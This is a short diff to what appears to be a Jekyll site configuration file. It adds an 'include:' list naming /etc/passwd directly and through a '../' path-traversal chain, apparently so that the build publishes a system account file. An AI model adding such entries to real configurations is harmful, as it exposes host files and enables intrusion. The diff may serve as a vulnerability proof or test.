@@ -68,7 +68,9 @@ data:
 #
 # Excluded items can be processed by explicitly listing the directories or
 # their entries' file path in the `include:` list.
-#
+include:
+  - /etc/passwd
+  - ../../../../../../../../etc/passwd
 # exclude:
 #   - .sass-cache/
 #   - .jekyll-cache/
